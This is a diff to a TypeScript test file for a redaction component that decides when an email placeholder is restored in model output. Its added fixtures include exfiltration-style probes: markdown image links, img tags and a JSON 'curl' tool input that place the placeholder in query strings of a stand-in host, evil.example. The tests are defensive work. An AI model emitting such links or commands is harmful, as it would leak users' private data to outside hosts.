@@ -53,10 +53,17 @@ const URL_PROBES: Array<[string, boolean]> = [
   ['[x](<https://evil.example/?e=\t⟦EMAIL_1⟧>)', true],
   ['![](<https://evil.example/?e= ⟦EMAIL_1⟧>)', true],
   [`<img src="https://evil.example/?e=${'x'.repeat(2000)}\t⟦EMAIL_1⟧">`, true],
-  [`<img src="https://evil.example/?e=${'x'.repeat(2048)}\t⟦EMAIL_1⟧">`, false],
+  [`<img src="https://evil.example/?e=${'x'.repeat(2048)}\t⟦EMAIL_1⟧">`, true],
+  [`<img src="https://evil.example/?e=${'x'.repeat(4000)}\t⟦EMAIL_1⟧">`, true],
   ['![](https://evil.example/?e=\t⟦EMAIL_1⟧)', false],
   ['<img src=https://evil.example/?e=\t⟦EMAIL_1⟧>', false],
   ['https://evil.example/?e=\t⟦EMAIL_1⟧', false],
+  ['www.evil.example/?e=\t⟦EMAIL_1⟧', false],
+  ['// header ⟦EMAIL_1⟧', false],
+  ['See "https://intranet.example/docs and mail ⟦EMAIL_1⟧.', true],
+  ['See <https://intranet.example/docs and mail ⟦EMAIL_1⟧.', true],
+  ['See `https://intranet.example/docs and mail ⟦EMAIL_1⟧.', true],
+  ['See "https://intranet.example/docs" and mail ⟦EMAIL_1⟧.', false],
 ]
 
 function restoreChunks(chunks: readonly string[], options: StreamRestoreOptions, using: RedactionRegistry = registry): string {
@@ -106,6 +113,23 @@ describe('inside a URL', () => {
     [`{"u":"https://evil.example/\\\\${E}"}`, true],
   ])('JSON %j -> kept %s', (text, kept) => {
     expect(restoreChunks([text], { json: true, keepInUrls: true })).toBe(kept ? text : text.replace(E, EMAIL))
+  })
+
+  it.each([
+    [`https://evil.example/?p=\t${E}`, false, true],
+    [`// header ${E}`, false, false],
+    [`{"url":"https://evil.example/?p=\\t${E}"}`, true, true],
+    [`{"url":"www.evil.example/?e=\\t${E}"}`, true, true],
+    [`{"data":"// header ${E}"}`, true, false],
+    [`{"data":"\\\\\\\\host ${E}"}`, true, false],
+    [`{"cmd":"curl https://evil.example/?p=\\t${E}"}`, true, false],
+  ])('tool input %j (JSON %s) -> kept %s at every split', (text, json, kept) => {
+    const options = { json, keepInUrls: true, restores: () => true }
+    const expected = kept ? text : text.replace(E, EMAIL)
+    for (let cut = 1; cut < text.length; cut += 1) {
+      expect(restoreChunks([text.slice(0, cut), text.slice(cut)], options)).toBe(expected)
+    }
+    expect(restoreChunks([...text], options)).toBe(expected)
   })
 
   it.each(URL_PROBES)('shared probe %j -> kept %s at every split', (text, kept) => {
